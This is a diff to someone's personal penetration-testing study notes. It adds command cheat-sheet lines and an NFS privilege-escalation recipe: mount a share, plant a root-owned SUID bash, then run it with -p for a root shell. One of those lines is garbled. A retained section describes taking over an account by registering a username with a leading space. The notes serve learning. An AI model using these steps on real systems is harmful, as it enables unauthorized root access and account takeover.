@@ -112,13 +112,15 @@ Kali Linux:
 * cat etc/passwd - see what user's shell is set as
 * lsb-release -a - shows what version of linux OS running
 * nano (file name) - create and edit text files
+* ./(.sh file) - run a .sh file
 
 PowerShell:
 * Select-String - find string in file (PowerShell grep equivalent)
   * `Select-String -Path "(file path)" '(string)'`
-
-Run a .sh file:
-* ./(.sh file)
+ 
+Windows:
+* windows + r -> lusrmgr.msc - edit and look at user accounts
+* System32 folders - critical files for operating system
 
 <h2>Vulnerabilities:</h2>
 
@@ -197,6 +199,22 @@ Broken Authentication:
 * sometimes there's already user registered ex: (arthur)
 * can register user with space beforehand ex: ( arthur)
 * maybe gain access to arthur account
+
+NFS
+* allows system to share directories and files with others over a network
+* access files remotely by mounting file system on a server that can be accessed
+* use /usr/sbin/showmount -e (IP) - display information about NFS mounts on a system
+* mkdir /tmp/mount - creates temporary directory to mount share to
+* mount - make files and directories on file system accessible
+* exploitation ex:
+  * sudo mount -t nfs (IP):(mount) /tmp/mount/ -nolock
+  * cp ~/Downloads/bash - copy bash shell
+  * sudo chown root bash - become root user to run executable
+  * sudo chmod +s bash - gives permission for file to be executed with the privileges of file's owner READ UP ON FILE PERMISSION FORMAT AND MEANINGS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+  * ssh ./bash -p - runs bash executible with the permissions
+
+SMTP:
+* 
 
 XSS
 * Input code into text box
